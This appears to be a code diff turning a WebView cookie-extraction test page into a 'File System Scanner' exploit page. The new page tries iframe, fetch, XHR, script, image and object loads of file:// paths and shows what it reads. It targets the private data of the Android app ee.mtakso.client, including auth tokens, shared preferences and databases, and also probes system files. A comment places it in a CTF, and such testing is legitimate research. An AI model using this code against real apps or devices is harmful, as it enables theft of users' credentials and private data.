@@ -1,250 +1,629 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebView Cookie Test</title>
+    <title>WebView File System Scanner</title>
     <meta charset="utf-8">
     <style>
         body {
             font-family: Arial, sans-serif;
             padding: 20px;
-            background: #f0f0f0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            margin: 0;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
         }
         .section {
-            background: white;
+            background: rgba(255,255,255,0.05);
             padding: 20px;
-            margin: 10px 0;
-            border-radius: 5px;
-            border-left: 4px solid #007bff;
+            margin: 15px 0;
+            border-radius: 10px;
+            border-left: 4px solid #ff6b6b;
         }
-        .success { border-left-color: #28a745; background: #d4edda; }
-        .error { border-left-color: #dc3545; background: #f8d7da; }
-        .warning { border-left-color: #ffc107; background: #fff3cd; }
+        .success { border-left-color: #51cf66; background: rgba(81,207,102,0.2); }
+        .warning { border-left-color: #ffd43b; background: rgba(255,212,59,0.2); }
+        .info { border-left-color: #339af0; background: rgba(51,154,240,0.2); }
+        .critical { border-left-color: #ff3838; background: rgba(255,56,56,0.2); }
         button {
-            background: #007bff;
+            background: linear-gradient(45deg, #ff6b6b, #ffd93d);
             color: white;
-            padding: 10px 20px;
             border: none;
-            border-radius: 5px;
+            padding: 12px 24px;
+            border-radius: 25px;
             cursor: pointer;
+            font-weight: bold;
             margin: 5px;
+            transition: transform 0.2s;
         }
-        .log {
-            background: #333;
-            color: #0f0;
+        button:hover { transform: scale(1.05); }
+        .code {
+            background: rgba(0,0,0,0.4);
             padding: 15px;
-            font-family: monospace;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            margin: 10px 0;
+            overflow-x: auto;
+            font-size: 14px;
             white-space: pre-wrap;
-            max-height: 300px;
+            max-height: 400px;
             overflow-y: auto;
-            border-radius: 5px;
         }
-        input {
-            width: 100%;
+        .file-item {
+            background: rgba(255,255,255,0.1);
             padding: 10px;
             margin: 5px 0;
-            border: 1px solid #ccc;
-            border-radius: 3px;
+            border-radius: 5px;
+            border-left: 3px solid #51cf66;
+        }
+        .file-success { border-left-color: #51cf66; background: rgba(81,207,102,0.3); }
+        .file-failed { border-left-color: #ff3838; background: rgba(255,56,56,0.2); }
+        .file-pending { border-left-color: #ffd43b; background: rgba(255,212,59,0.2); }
+        input {
+            width: 70%;
+            padding: 10px;
+            margin: 5px;
+            border: 1px solid rgba(255,255,255,0.3);
+            border-radius: 5px;
+            background: rgba(255,255,255,0.1);
+            color: white;
+        }
+        input::placeholder { color: rgba(255,255,255,0.7); }
+        iframe {
+            width: 100%;
+            height: 200px;
+            border: 1px solid rgba(255,255,255,0.3);
+            border-radius: 5px;
+            background: white;
+            margin: 10px 0;
+        }
+        .hidden { display: none; }
+        select {
+            padding: 10px;
+            margin: 5px;
+            border: 1px solid rgba(255,255,255,0.3);
+            border-radius: 5px;
+            background: rgba(255,255,255,0.1);
+            color: white;
         }
     </style>
 </head>
 <body>
-    <h1>WebView Cookie Extraction Test</h1>
-    
-    <div class="section">
-        <h2>Configuration</h2>
-        <label>Target URL:</label>
-        <input type="text" id="targetUrl" value="https://node.ctftime/route-sharing/routeSharing/getOrder">
-    </div>
+    <div class="container">
+        <h1>📁 WebView File System Scanner</h1>
+        <p>Testing access to local files through various HTML elements and techniques</p>
+        
+        <div class="section critical">
+            <h2>🎯 Quick File Tests</h2>
+            <button onclick="testKnownFiles()">🔍 Test Known App Files</button>
+            <button onclick="testCommonPaths()">📂 Test Common Android Paths</button>
+            <button onclick="testAllMethods()">🚀 Test All Methods</button>
+            <div id="quickResults"></div>
+        </div>
 
-    <div class="section">
-        <h2>Tests</h2>
-        <button onclick="testFetch()">Test Fetch API</button>
-        <button onclick="testXHR()">Test XMLHttpRequest</button>
-        <button onclick="testImage()">Test Image Load</button>
-        <button onclick="testScript()">Test Script Load</button>
-        <button onclick="testAll()">Run All Tests</button>
-    </div>
+        <div class="section warning">
+            <h2>🖼️ Iframe File Loading</h2>
+            <p>Test file access through iframes (most promising method)</p>
+            <input type="text" id="iframeFile" placeholder="file:///data/data/ee.mtakso.client/shared_prefs/settings_preference.xml">
+            <button onclick="testIframe()">🎪 Test Iframe</button>
+            <div id="iframeContainer"></div>
+            <div id="iframeResults"></div>
+        </div>
 
-    <div class="section">
-        <h2>Results</h2>
-        <div id="results">Click a test button to start...</div>
-    </div>
+        <div class="section warning">
+            <h2>🖼️ Image File Loading</h2>
+            <p>Test if files can be loaded as images (reveals existence)</p>
+            <input type="text" id="imageFile" placeholder="file:///data/data/ee.mtakso.client/files/app_data.db">
+            <button onclick="testImage()">📸 Test Image Load</button>
+            <div id="imageResults"></div>
+        </div>
 
-    <div class="section">
-        <h2>Logs</h2>
-        <div class="log" id="logs"></div>
+        <div class="section warning">
+            <h2>📜 Script File Loading</h2>
+            <p>Test if files can be loaded as scripts</p>
+            <input type="text" id="scriptFile" placeholder="file:///data/data/ee.mtakso.client/files/config.js">
+            <button onclick="testScript()">📜 Test Script Load</button>
+            <div id="scriptResults"></div>
+        </div>
+
+        <div class="section warning">
+            <h2>🔗 Link File Loading</h2>
+            <p>Test CSS/link element file loading</p>
+            <input type="text" id="linkFile" placeholder="file:///data/data/ee.mtakso.client/files/style.css">
+            <button onclick="testLink()">🔗 Test Link Load</button>
+            <div id="linkResults"></div>
+        </div>
+
+        <div class="section warning">
+            <h2>📡 Fetch File Loading</h2>
+            <p>Test direct fetch API access to files</p>
+            <input type="text" id="fetchFile" placeholder="file:///data/data/ee.mtakso.client/cache/temp.json">
+            <button onclick="testFetch()">📡 Test Fetch</button>
+            <div id="fetchResults"></div>
+        </div>
+
+        <div class="section info">
+            <h2>🛠️ Custom File Test</h2>
+            <input type="text" id="customFile" placeholder="Enter any file path to test">
+            <select id="testMethod">
+                <option value="iframe">Iframe</option>
+                <option value="image">Image</option>
+                <option value="script">Script</option>
+                <option value="link">Link/CSS</option>
+                <option value="fetch">Fetch API</option>
+                <option value="xhr">XMLHttpRequest</option>
+                <option value="object">Object/Embed</option>
+            </select>
+            <button onclick="testCustomFile()">🧪 Test Custom</button>
+            <div id="customResults"></div>
+        </div>
+
+        <div class="section success">
+            <h2>✅ Successful File Access</h2>
+            <div id="successResults">
+                <p>Accessible files will appear here...</p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>📋 File Enumeration</h2>
+            <button onclick="enumerateAppFiles()">📝 Enumerate App-Specific Files</button>
+            <button onclick="enumerateSystemFiles()">⚙️ Enumerate System Files</button>
+            <div id="enumerationResults"></div>
+        </div>
     </div>
 
     <script>
-        let logText = '';
-        
+        let accessibleFiles = [];
+        let testResults = {};
+        let testCount = 0;
+
         function log(message) {
-            const time = new Date().toLocaleTimeString();
-            logText += '[' + time + '] ' + message + '\n';
-            document.getElementById('logs').textContent = logText;
             console.log(message);
+            const timestamp = new Date().toLocaleTimeString();
+            return '[' + timestamp + '] ' + message;
         }
-        
-        function showResult(test, success, details) {
-            const resultsDiv = document.getElementById('results');
-            const className = success ? 'success' : 'error';
-            const status = success ? 'SUCCESS' : 'FAILED';
+
+        function showResult(method, file, success, details, element = null) {
+            const className = success ? 'file-success' : 'file-failed';
+            const icon = success ? '✅' : '❌';
+            const result = '<div class="file-item ' + className + '">' + 
+                          icon + ' <strong>' + method + '</strong>: ' + file + 
+                          '<br><small>' + details + '</small></div>';
             
-            resultsDiv.innerHTML += '<div class="' + className + '">' +
-                '<h3>' + test + ': ' + status + '</h3>' +
-                '<p>' + details + '</p>' +
-                '</div>';
-        }
-        
-        function getTargetUrl() {
-            return document.getElementById('targetUrl').value;
-        }
-        
-        async function testFetch() {
-            log('Testing Fetch API...');
-            const url = getTargetUrl() + '?test=fetch&t=' + Date.now();
-            
-            try {
-                const startTime = Date.now();
-                const response = await fetch(url, {
-                    method: 'GET',
-                    credentials: 'include',
-                    mode: 'cors'
-                });
-                const endTime = Date.now();
-                const timing = endTime - startTime;
+            if (success) {
+                accessibleFiles.push({method: method, file: file, details: details});
+                document.getElementById('successResults').innerHTML += result;
                 
-                const text = await response.text();
-                const details = 'Status: ' + response.status + ', Time: ' + timing + 'ms, Length: ' + text.length;
-                
-                log('Fetch result: ' + details);
-                showResult('Fetch API', response.status === 200, details);
-                
-                if (response.status === 200) {
-                    alert('FETCH SUCCESS! Status: 200, Response: ' + text.substring(0, 100));
+                if (element) {
+                    document.getElementById('successResults').appendChild(element);
                 }
                 
-            } catch (error) {
-                log('Fetch error: ' + error.message);
-                showResult('Fetch API', false, 'Error: ' + error.message);
+                alert('🎯 FILE ACCESS SUCCESS!\nMethod: ' + method + '\nFile: ' + file);
             }
-        }
-        
-        function testXHR() {
-            log('Testing XMLHttpRequest...');
-            const url = getTargetUrl() + '?test=xhr&t=' + Date.now();
             
-            const xhr = new XMLHttpRequest();
+            return result;
+        }
+
+        function testKnownFiles() {
+            const resultsDiv = document.getElementById('quickResults');
+            resultsDiv.innerHTML = '<p>🔍 Testing known CTF app files...</p>';
+            
+            // Known files for ee.mtakso.client (your CTF app)
+            const knownFiles = [
+                'file:///data/data/ee.mtakso.client/shared_prefs/settings_preference.xml',
+                'file:///data/data/ee.mtakso.client/shared_prefs/user_preferences.xml',
+                'file:///data/data/ee.mtakso.client/files/app_data.db',
+                'file:///data/data/ee.mtakso.client/files/config.json',
+                'file:///data/data/ee.mtakso.client/files/auth_token.txt',
+                'file:///data/data/ee.mtakso.client/files/user_data.json',
+                'file:///data/data/ee.mtakso.client/cache/temp_data.xml',
+                'file:///data/data/ee.mtakso.client/databases/app.db',
+                'file:///data/data/ee.mtakso.client/databases/cache.db'
+            ];
+            
+            let results = '<h3>Testing Known Files:</h3>';
+            
+            knownFiles.forEach((file, index) => {
+                setTimeout(() => {
+                    testFileWithMethod(file, 'iframe', (success, details) => {
+                        results += showResult('iframe', file, success, details);
+                        resultsDiv.innerHTML = results;
+                    });
+                }, index * 500);
+            });
+        }
+
+        function testCommonPaths() {
+            const resultsDiv = document.getElementById('quickResults');
+            
+            const commonPaths = [
+                'file:///android_asset/',
+                'file:///android_res/',
+                'file:///data/data/',
+                'file:///data/local/tmp/',
+                'file:///storage/emulated/0/',
+                'file:///sdcard/',
+                'file:///system/etc/hosts',
+                'file:///proc/version',
+                'file:///proc/cpuinfo'
+            ];
+            
+            let results = '<h3>Testing Common Paths:</h3>';
+            
+            commonPaths.forEach((path, index) => {
+                setTimeout(() => {
+                    testFileWithMethod(path, 'iframe', (success, details) => {
+                        results += showResult('iframe', path, success, details);
+                        resultsDiv.innerHTML = results;
+                    });
+                }, index * 300);
+            });
+        }
+
+        function testIframe() {
+            const file = document.getElementById('iframeFile').value.trim();
+            if (!file) {
+                alert('Please enter a file path');
+                return;
+            }
+            
+            const resultsDiv = document.getElementById('iframeResults');
+            const container = document.getElementById('iframeContainer');
+            
+            resultsDiv.innerHTML = '<div class="file-item file-pending">🔄 Testing iframe access to: ' + file + '</div>';
+            
+            const iframe = document.createElement('iframe');
+            iframe.style.width = '100%';
+            iframe.style.height = '300px';
+            iframe.style.border = '1px solid #ccc';
+            
             const startTime = Date.now();
             
-            xhr.withCredentials = true;
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4) {
-                    const timing = Date.now() - startTime;
-                    const details = 'Status: ' + xhr.status + ', Time: ' + timing + 'ms, Length: ' + xhr.responseText.length;
-                    
-                    log('XHR result: ' + details);
-                    showResult('XMLHttpRequest', xhr.status === 200, details);
-                    
-                    if (xhr.status === 200) {
-                        alert('XHR SUCCESS! Status: 200, Response: ' + xhr.responseText.substring(0, 100));
+            iframe.onload = function() {
+                const timing = Date.now() - startTime;
+                try {
+                    // Try to access iframe content
+                    const content = iframe.contentDocument || iframe.contentWindow.document;
+                    if (content && content.body) {
+                        const text = content.body.innerText || content.body.textContent;
+                        if (text && text.length > 0) {
+                            resultsDiv.innerHTML = showResult('iframe', file, true, 'Loaded successfully in ' + timing + 'ms, Content length: ' + text.length, iframe);
+                            
+                            // Show content preview
+                            const preview = document.createElement('div');
+                            preview.className = 'code';
+                            preview.textContent = 'Content preview:\n' + text.substring(0, 1000);
+                            resultsDiv.appendChild(preview);
+                        } else {
+                            resultsDiv.innerHTML = showResult('iframe', file, false, 'Loaded but no readable content (' + timing + 'ms)');
+                        }
+                    } else {
+                        resultsDiv.innerHTML = showResult('iframe', file, false, 'Loaded but content not accessible (' + timing + 'ms)');
                     }
+                } catch (error) {
+                    resultsDiv.innerHTML = showResult('iframe', file, false, 'Loaded but cross-origin blocked (' + timing + 'ms)');
                 }
             };
             
-            xhr.open('GET', url, true);
-            xhr.send();
+            iframe.onerror = function() {
+                const timing = Date.now() - startTime;
+                resultsDiv.innerHTML = showResult('iframe', file, false, 'Failed to load (' + timing + 'ms)');
+            };
+            
+            // Set timeout
+            setTimeout(() => {
+                if (!iframe.contentDocument) {
+                    resultsDiv.innerHTML = showResult('iframe', file, false, 'Timeout after 10 seconds');
+                }
+            }, 10000);
+            
+            iframe.src = file;
+            container.innerHTML = '';
+            container.appendChild(iframe);
         }
-        
+
         function testImage() {
-            log('Testing Image load...');
-            const url = getTargetUrl() + '?test=image&t=' + Date.now();
+            const file = document.getElementById('imageFile').value.trim();
+            if (!file) {
+                alert('Please enter a file path');
+                return;
+            }
             
-            const img = new Image();
-            const startTime = Date.now();
-            
-            img.onload = function() {
-                const timing = Date.now() - startTime;
-                const details = 'Loaded successfully in ' + timing + 'ms, Size: ' + img.naturalWidth + 'x' + img.naturalHeight;
-                
-                log('Image result: ' + details);
-                showResult('Image Load', true, details);
-                alert('IMAGE SUCCESS! ' + details);
-            };
-            
-            img.onerror = function() {
-                const timing = Date.now() - startTime;
-                const details = 'Failed to load in ' + timing + 'ms';
-                
-                log('Image error: ' + details);
-                showResult('Image Load', false, details);
-            };
-            
-            img.src = url;
+            testFileWithMethod(file, 'image', (success, details) => {
+                document.getElementById('imageResults').innerHTML = showResult('image', file, success, details);
+            });
         }
-        
+
         function testScript() {
-            log('Testing Script load...');
-            const url = getTargetUrl() + '?test=script&t=' + Date.now();
+            const file = document.getElementById('scriptFile').value.trim();
+            if (!file) {
+                alert('Please enter a file path');
+                return;
+            }
             
-            const script = document.createElement('script');
+            testFileWithMethod(file, 'script', (success, details) => {
+                document.getElementById('scriptResults').innerHTML = showResult('script', file, success, details);
+            });
+        }
+
+        function testLink() {
+            const file = document.getElementById('linkFile').value.trim();
+            if (!file) {
+                alert('Please enter a file path');
+                return;
+            }
+            
+            testFileWithMethod(file, 'link', (success, details) => {
+                document.getElementById('linkResults').innerHTML = showResult('link', file, success, details);
+            });
+        }
+
+        function testFetch() {
+            const file = document.getElementById('fetchFile').value.trim();
+            if (!file) {
+                alert('Please enter a file path');
+                return;
+            }
+            
+            testFileWithMethod(file, 'fetch', (success, details) => {
+                document.getElementById('fetchResults').innerHTML = showResult('fetch', file, success, details);
+            });
+        }
+
+        function testCustomFile() {
+            const file = document.getElementById('customFile').value.trim();
+            const method = document.getElementById('testMethod').value;
+            
+            if (!file) {
+                alert('Please enter a file path');
+                return;
+            }
+            
+            testFileWithMethod(file, method, (success, details) => {
+                document.getElementById('customResults').innerHTML = showResult(method, file, success, details);
+            });
+        }
+
+        function testFileWithMethod(file, method, callback) {
             const startTime = Date.now();
             
-            script.onload = function() {
-                const timing = Date.now() - startTime;
-                const details = 'Script loaded in ' + timing + 'ms';
-                
-                log('Script result: ' + details);
-                showResult('Script Load', true, details);
-                alert('SCRIPT SUCCESS! ' + details);
-                
-                document.head.removeChild(script);
-            };
+            switch (method) {
+                case 'iframe':
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    
+                    iframe.onload = function() {
+                        const timing = Date.now() - startTime;
+                        try {
+                            const content = iframe.contentDocument || iframe.contentWindow.document;
+                            if (content && content.body) {
+                                const text = content.body.innerText || content.body.textContent || '';
+                                callback(text.length > 0, 'Loaded in ' + timing + 'ms, Content: ' + text.substring(0, 100));
+                            } else {
+                                callback(false, 'Loaded but no content (' + timing + 'ms)');
+                            }
+                        } catch (e) {
+                            callback(false, 'Cross-origin blocked (' + timing + 'ms)');
+                        }
+                        document.body.removeChild(iframe);
+                    };
+                    
+                    iframe.onerror = function() {
+                        callback(false, 'Failed to load (' + (Date.now() - startTime) + 'ms)');
+                        document.body.removeChild(iframe);
+                    };
+                    
+                    iframe.src = file;
+                    document.body.appendChild(iframe);
+                    break;
+                    
+                case 'image':
+                    const img = new Image();
+                    
+                    img.onload = function() {
+                        const timing = Date.now() - startTime;
+                        callback(true, 'Loaded as image in ' + timing + 'ms, Size: ' + img.naturalWidth + 'x' + img.naturalHeight);
+                    };
+                    
+                    img.onerror = function() {
+                        callback(false, 'Failed to load as image (' + (Date.now() - startTime) + 'ms)');
+                    };
+                    
+                    img.src = file;
+                    break;
+                    
+                case 'script':
+                    const script = document.createElement('script');
+                    
+                    script.onload = function() {
+                        callback(true, 'Loaded as script in ' + (Date.now() - startTime) + 'ms');
+                        document.head.removeChild(script);
+                    };
+                    
+                    script.onerror = function() {
+                        callback(false, 'Failed to load as script (' + (Date.now() - startTime) + 'ms)');
+                        if (script.parentNode) document.head.removeChild(script);
+                    };
+                    
+                    script.src = file;
+                    document.head.appendChild(script);
+                    break;
+                    
+                case 'link':
+                    const link = document.createElement('link');
+                    link.rel = 'stylesheet';
+                    
+                    link.onload = function() {
+                        callback(true, 'Loaded as CSS in ' + (Date.now() - startTime) + 'ms');
+                        document.head.removeChild(link);
+                    };
+                    
+                    link.onerror = function() {
+                        callback(false, 'Failed to load as CSS (' + (Date.now() - startTime) + 'ms)');
+                        if (link.parentNode) document.head.removeChild(link);
+                    };
+                    
+                    link.href = file;
+                    document.head.appendChild(link);
+                    break;
+                    
+                case 'fetch':
+                    fetch(file)
+                        .then(response => {
+                            const timing = Date.now() - startTime;
+                            if (response.ok) {
+                                return response.text().then(text => {
+                                    callback(true, 'Fetched in ' + timing + 'ms, Length: ' + text.length + ', Content: ' + text.substring(0, 100));
+                                });
+                            } else {
+                                callback(false, 'Fetch failed with status ' + response.status + ' (' + timing + 'ms)');
+                            }
+                        })
+                        .catch(error => {
+                            callback(false, 'Fetch error: ' + error.message + ' (' + (Date.now() - startTime) + 'ms)');
+                        });
+                    break;
+                    
+                case 'xhr':
+                    const xhr = new XMLHttpRequest();
+                    xhr.onreadystatechange = function() {
+                        if (xhr.readyState === 4) {
+                            const timing = Date.now() - startTime;
+                            if (xhr.status === 200) {
+                                callback(true, 'XHR success in ' + timing + 'ms, Length: ' + xhr.responseText.length + ', Content: ' + xhr.responseText.substring(0, 100));
+                            } else {
+                                callback(false, 'XHR failed with status ' + xhr.status + ' (' + timing + 'ms)');
+                            }
+                        }
+                    };
+                    xhr.open('GET', file, true);
+                    xhr.send();
+                    break;
+                    
+                case 'object':
+                    const obj = document.createElement('object');
+                    obj.style.display = 'none';
+                    obj.data = file;
+                    
+                    obj.onload = function() {
+                        callback(true, 'Loaded as object in ' + (Date.now() - startTime) + 'ms');
+                        document.body.removeChild(obj);
+                    };
+                    
+                    obj.onerror = function() {
+                        callback(false, 'Failed to load as object (' + (Date.now() - startTime) + 'ms)');
+                        document.body.removeChild(obj);
+                    };
+                    
+                    document.body.appendChild(obj);
+                    break;
+            }
             
-            script.onerror = function() {
-                const timing = Date.now() - startTime;
-                const details = 'Script failed in ' + timing + 'ms';
-                
-                log('Script error: ' + details);
-                showResult('Script Load', false, details);
-                
-                if (script.parentNode) {
-                    document.head.removeChild(script);
+            // Timeout fallback
+            setTimeout(() => {
+                if (callback) {
+                    callback(false, 'Timeout after 10 seconds');
                 }
-            };
-            
-            script.src = url;
-            document.head.appendChild(script);
+            }, 10000);
         }
-        
-        async function testAll() {
-            document.getElementById('results').innerHTML = '<h3>Running all tests...</h3>';
-            logText = '';
+
+        function testAllMethods() {
+            const testFile = 'file:///data/data/ee.mtakso.client/shared_prefs/settings_preference.xml';
+            const methods = ['iframe', 'image', 'script', 'link', 'fetch', 'xhr', 'object'];
+            const resultsDiv = document.getElementById('quickResults');
             
-            log('Starting comprehensive test...');
-            log('Target: ' + getTargetUrl());
-            log('User Agent: ' + navigator.userAgent);
-            log('Domain: ' + window.location.hostname);
-            log('==========================================');
+            let results = '<h3>Testing All Methods on: ' + testFile + '</h3>';
+            resultsDiv.innerHTML = results;
             
-            await testFetch();
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            testXHR();
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            testImage();
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            testScript();
-            
-            log('==========================================');
-            log('All tests completed!');
+            methods.forEach((method, index) => {
+                setTimeout(() => {
+                    testFileWithMethod(testFile, method, (success, details) => {
+                        results += showResult(method, testFile, success, details);
+                        resultsDiv.innerHTML = results;
+                    });
+                }, index * 1000);
+            });
         }
-        
+
+        function enumerateAppFiles() {
+            const resultsDiv = document.getElementById('enumerationResults');
+            resultsDiv.innerHTML = '<p>🔍 Enumerating app-specific files...</p>';
+            
+            // Common app file patterns
+            const appPackage = 'ee.mtakso.client';
+            const filePatterns = [
+                '/shared_prefs/',
+                '/files/',
+                '/cache/',
+                '/databases/',
+                '/app_webview/',
+                '/code_cache/',
+                '/no_backup/'
+            ];
+            
+            const fileTypes = [
+                'settings.xml', 'preferences.xml', 'config.json', 'app_data.db',
+                'cache.db', 'user.json', 'auth.txt', 'token.txt', 'session.xml'
+            ];
+            
+            let results = '<h3>App File Enumeration:</h3>';
+            
+            filePatterns.forEach(pattern => {
+                fileTypes.forEach(fileType => {
+                    const fullPath = 'file:///data/data/' + appPackage + pattern + fileType;
+                    
+                    setTimeout(() => {
+                        testFileWithMethod(fullPath, 'iframe', (success, details) => {
+                            if (success) {
+                                results += showResult('iframe', fullPath, success, details);
+                                resultsDiv.innerHTML = results;
+                            }
+                        });
+                    }, Math.random() * 5000);
+                });
+            });
+        }
+
+        function enumerateSystemFiles() {
+            const systemFiles = [
+                'file:///system/build.prop',
+                'file:///proc/version',
+                'file:///proc/cpuinfo',
+                'file:///proc/meminfo',
+                'file:///system/etc/hosts',
+                'file:///data/local/tmp/',
+                'file:///storage/emulated/0/Android/'
+            ];
+            
+            const resultsDiv = document.getElementById('enumerationResults');
+            let results = '<h3>System File Enumeration:</h3>';
+            
+            systemFiles.forEach((file, index) => {
+                setTimeout(() => {
+                    testFileWithMethod(file, 'iframe', (success, details) => {
+                        results += showResult('iframe', file, success, details);
+                        resultsDiv.innerHTML = results;
+                    });
+                }, index * 500);
+            });
+        }
+
+        // Auto-start with known file
         window.onload = function() {
-            log('WebView Cookie Test loaded');
-            log('Ready to test cross-domain cookie behavior');
+            log('WebView File System Scanner loaded');
+            document.getElementById('iframeFile').value = 'file:///data/data/ee.mtakso.client/shared_prefs/settings_preference.xml';
+            document.getElementById('imageFile').value = 'file:///data/data/ee.mtakso.client/files/app_data.db';
+            document.getElementById('scriptFile').value = 'file:///data/data/ee.mtakso.client/files/config.js';
+            document.getElementById('linkFile').value = 'file:///data/data/ee.mtakso.client/files/style.css';
+            document.getElementById('fetchFile').value = 'file:///data/data/ee.mtakso.client/cache/temp.json';
+            document.getElementById('customFile').value = 'file:///data/data/ee.mtakso.client/shared_prefs/';
         };
     </script>
 </body>
